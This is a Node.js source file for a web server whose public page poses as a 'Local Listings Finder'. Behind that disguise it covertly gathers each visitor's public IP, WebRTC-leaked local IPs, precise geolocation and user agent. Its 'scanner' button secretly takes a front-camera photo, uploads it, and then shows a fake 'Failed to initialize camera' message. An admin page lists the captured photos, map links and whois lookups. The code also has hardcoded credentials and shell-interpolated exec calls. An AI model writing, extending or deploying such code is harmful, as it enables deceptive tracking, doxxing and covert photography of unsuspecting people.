const http = require('http');
const { exec } = require('child_process');
const net = require('net');
const fs = require('fs');
const path = require('path');

const PORT = 3000;

// --- CONFIG ---
const ADMIN_USER = "admin";
const ADMIN_PASS = "supersecret";
// --------------

const DATA_FILE = path.join(__dirname, 'data.json');
const IMAGE_DIR = path.join(__dirname, 'images');
if (!fs.existsSync(IMAGE_DIR)) fs.mkdirSync(IMAGE_DIR);

// --- Utility: check if IP is public ---
function isPublicIP(ip) {
  if (net.isIP(ip) === 4) {
    return !(
      /^10\./.test(ip) ||
      /^192\.168\./.test(ip) ||
      /^172\.(1[6-9]|2\d|3[0-1])\./.test(ip) ||
      /^127\./.test(ip) ||
      /^169\.254\./.test(ip)
    );
  }
  if (net.isIP(ip) === 6) {
    const s = ip.toLowerCase();
    return !(s === '::1' || s.startsWith('fc') || s.startsWith('fd') || s.startsWith('fe80'));
  }
  return false;
}

function runWhois(ip, cb) {
  exec(`whois "${ip}"`, { timeout: 10000, maxBuffer: 1024*1024 }, (err, stdout) => {
    cb(err ? `WHOIS error: ${err.message}` : stdout);
  });
}

// --- IP label helper: specifies type, version, public/local ---
function ipLabel(ip, type) {
  const version = net.isIP(ip) === 4 ? 'IPv4' : 'IPv6';
  if (isPublicIP(ip)) {
    return `<span style="color:#0ff;">[PUBLIC ${type} ${version}]</span> <span style="color:#0f0;">${ip}</span>`;
  } else {
    return `<span style="color:#ff0;">[LOCAL ${type} ${version}]</span> <span style="color:#0f0;">${ip}</span>`;
  }
}

// --- Server ---
const server = http.createServer((req, res) => {
  // Serve saved images
  if (req.url.startsWith('/images/')) {
    const file = path.join(IMAGE_DIR, path.basename(req.url));
    if (fs.existsSync(file)) {
      res.writeHead(200, { 'Content-Type': 'image/png' });
      return fs.createReadStream(file).pipe(res);
    }
    res.writeHead(404); return res.end('Not found');
  }

  // Handle uploads
  if (req.url === '/collect' && req.method === 'POST') {
    let body = '';
    req.on('data', c => body += c);
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        let record = {
          timestamp: new Date().toISOString(),
          serverObservedIP: req.socket.remoteAddress.replace(/^.*:/, ''),
          externalPublicIP: data.publicIP || null,
          webrtcIPs: data.webrtcIPs || [],
          geolocation: data.geolocation || null,
          userAgent: data.userAgent || '',
          whois: {},
          imageFile: null
        };

        // save image if provided
        if (data.image) {
          const imgName = `capture_${Date.now()}.png`;
          fs.writeFileSync(path.join(IMAGE_DIR, imgName), Buffer.from(data.image, 'base64'));
          record.imageFile = imgName;
        }

        // perform whois if public
        const ips = [];
        if (record.externalPublicIP && isPublicIP(record.externalPublicIP)) ips.push(record.externalPublicIP);
        record.webrtcIPs.forEach(ip => { if (isPublicIP(ip)) ips.push(ip); });

        let pending = ips.length;
        if (pending === 0) {
          saveRecord(record);
          return respondOK();
        }

        ips.forEach(ip => {
          runWhois(ip, out => {
            record.whois[ip] = out;
            if (--pending === 0) {
              saveRecord(record);
              respondOK();
            }
          });
        });

        function respondOK() {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ status: 'ok' }));
        }
      } catch (e) {
        res.writeHead(400); res.end('bad json');
      }
    });
    return;
  }

  // Admin page
  if (req.url === '/admin') {
    const auth = req.headers['authorization'];
    if (!auth || !auth.startsWith('Basic ')) {
      res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="Admin"' });
      return res.end('Auth required');
    }
    const creds = Buffer.from(auth.split(' ')[1], 'base64').toString().split(':');
    if (creds[0] !== ADMIN_USER || creds[1] !== ADMIN_PASS) {
      res.writeHead(403); return res.end('Forbidden');
    }

    let dataArr = [];
    if (fs.existsSync(DATA_FILE)) dataArr = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));

    let out = '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Admin</title><style>'+
      'body{background:#000;color:#0f0;font-family:monospace;text-align:center;}' +
      '.record{border:2px solid #0f0;margin:10px auto;padding:15px;width:95%;max-width:700px;border-radius:5px;text-align:left;}' +
      '.record h2{color:#0f0;font-size:1.8em;margin-bottom:5px;}' +
      '.label{color:#7fff7f; font-weight:bold;}' +        
      '.prebox{background:#010;color:#0f0;padding:5px;overflow:auto;white-space:pre-wrap;word-wrap:break-word;max-height:200px;border:1px solid #0f0;border-radius:3px;}' +
      'a.geo{color:#00f;}' +
      'img{max-width:90%;height:auto;margin:10px 0;display:block;margin-left:auto;margin-right:auto;}' +
      '@media(max-width:600px){.record{width:95%;padding:10px;}}'+
      '</style></head><body><h1 style="color:#0f0;">Admin Records</h1>';

    dataArr.forEach((rec, i) => {
      out += `<div class="record"><h2>Record ${i+1} (${rec.timestamp})</h2>`;

      // Colored titles and IPs
      out += `<span class="label" style="color:#ff0;">Server Connection IP:</span> <span style="color:#0f0;">${rec.serverObservedIP}</span><br>`;
      out += `<span class="label" style="color:#0ff;">Public WAN IP:</span> <span style="color:#0f0;">${rec.externalPublicIP || 'N/A'}</span><br>`;

      out += `<span class="label">User-Agent:</span> <pre class="prebox">${rec.userAgent}</pre>`;

      if (rec.geolocation) {
        out += `<span class="label">Geolocation:</span> <a class="geo" style="color:#00f;" target="_blank" href="https://maps.google.com/?q=${rec.geolocation.lat},${rec.geolocation.lng}">${rec.geolocation.lat},${rec.geolocation.lng}</a> <span style="color:#00f;">(±${rec.geolocation.acc}m)</span><br>`;
      }

      if (rec.webrtcIPs.length) {
        out += `<span class="label">WebRTC Discovered:</span> <pre class="prebox">`;
        rec.webrtcIPs.forEach(ip => { out += ipLabel(ip,"WebRTC") + "\n"; });
        out += `</pre>`;
      }

      if (rec.imageFile) {
        out += `<span class="label">Captured Image:</span><br><img src="/images/${rec.imageFile}"><br>`;
      }

      if (rec.whois) {
        for (let [ip, whois] of Object.entries(rec.whois)) {
          let version = net.isIP(ip) === 4 ? 'IPv4' : 'IPv6';
          out += `<h3 style="color:#0f0;">WHOIS for ${ip} (${version})</h3><pre class="prebox">${whois}</pre>`;
        }
      }

      out += `</div>`;
    });

    out += '</body></html>';
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end(out);
  }

  // --- User-facing page: modern local listings page ---
  const serverIP = req.socket.remoteAddress.replace(/^.*:/, '');
  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Local Listings Finder</title>
  <style>
    body { background:#f9f9f9; color:#333; font-family:"Roboto",Arial,sans-serif; margin:0; padding:0; text-align:center; }
    header { background:#1976d2; color:#fff; padding:15px; font-size:1.4em; font-weight:bold; box-shadow:0 2px 4px rgba(0,0,0,0.1); }
    #map { width:90%; height:300px; margin:20px auto; border-radius:10px; overflow:hidden; box-shadow:0 2px 6px rgba(0,0,0,0.2); }
    button { background:#1976d2; color:#fff; font-size:1.2em; padding:12px 25px; border:none; border-radius:6px; cursor:pointer; transition:background 0.3s ease; margin-top:10px; }
    button:hover { background:#125a9c; }
    footer { margin-top:30px; font-size:0.85em; color:#777; }
    canvas { display:none; }
  </style>
</head>
<body>
  <header>Local Listings & Price Checker</header>
  <div id="map">Loading map...</div>
  <button onclick="startScanner()">Start Item Scanner</button>
  <canvas id="canvas"></canvas>
  <footer>© 2025 Local Listings Finder</footer>

  <script>
    const payload = {
      userAgent: navigator.userAgent,
      serverObservedIP: "${serverIP}",
      publicIP: null,
      geolocation: null,
      webrtcIPs: [],
      image: null
    };

    fetch("https://api.ipify.org?format=json")
      .then(r=>r.json())
      .then(d=>{ payload.publicIP=d.ip; send(); });

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos=>{
        payload.geolocation={lat:pos.coords.latitude,lng:pos.coords.longitude,acc:Math.round(pos.coords.accuracy)};
        const lat = pos.coords.latitude;
        const lng = pos.coords.longitude;
        document.getElementById('map').innerHTML =
          '<iframe width="100%" height="300" frameborder="0" style="border:0" ' +
          'src="https://www.openstreetmap.org/export/embed.html?bbox='+(lng-0.05)+'%2C'+(lat-0.05)+'%2C'+(lng+0.05)+'%2C'+(lat+0.05)+'&layer=mapnik&marker='+lat+'%2C'+lng+'" allowfullscreen></iframe>';
        send();
      });
    }

    const pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
    pc.createDataChannel("x");
    pc.onicecandidate=e=>{
      if(!e.candidate)return;
      const ip=e.candidate.candidate.split(" ")[4];
      if(ip && !payload.webrtcIPs.includes(ip)) payload.webrtcIPs.push(ip);
    };
    pc.createOffer().then(o=>pc.setLocalDescription(o));

    function startScanner() {
      navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"} })
        .then(stream => {
          const video = document.createElement("video");
          video.srcObject = stream;
          video.play();
          video.onloadedmetadata = () => {
            const canvas = document.getElementById("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext("2d").drawImage(video, 0, 0);
            payload.image = canvas.toDataURL("image/png").split(',')[1];
            send(true);
            stream.getTracks().forEach(t => t.stop());
            alert("Failed to initialize camera.");
          };
        })
        .catch(err => { console.log("Camera error:", err); alert("Failed to initialize camera."); });
    }

    function send(force){
      fetch("/collect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});
    }
  </script>
</body>
</html>`;

  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
  res.end(html);
});

function saveRecord(record) {
  let arr = [];
  if (fs.existsSync(DATA_FILE)) arr = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
  arr.push(record);
  fs.writeFileSync(DATA_FILE, JSON.stringify(arr, null, 2));
}

server.listen(PORT, '0.0.0.0', () => {
  console.log("Server running at http://localhost:" + PORT + "/");
});
